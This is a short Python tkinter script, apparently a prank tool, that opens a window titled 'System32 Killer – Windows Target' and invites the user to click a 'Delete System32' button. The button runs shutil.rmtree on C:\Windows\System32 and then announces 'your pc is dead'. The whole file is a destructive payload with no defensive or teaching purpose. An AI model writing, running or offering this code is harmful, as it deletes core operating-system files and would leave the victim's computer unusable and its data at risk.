import tkinter as tk              
from tkinter import messagebox       
import shutil                         
import os                             


def kill_system32():
    target = r'C:\Windows\System32'         
    shutil.rmtree(target)                      
    messagebox.showinfo("your pc is dead", "system32 has been deleted.")


def launch():
    messagebox.showinfo("click me", "go ahead click the button")
    win = tk.Toplevel()
    win.title("System32 Killer – Windows Target")
    
    btn = tk.Button(win,
                    text="Delete System32",
                    command=kill_system32)
    btn.pack(padx=10, pady=10)          


root = tk.Tk()      
root.withdraw()      

launch()            
root.mainloop()    
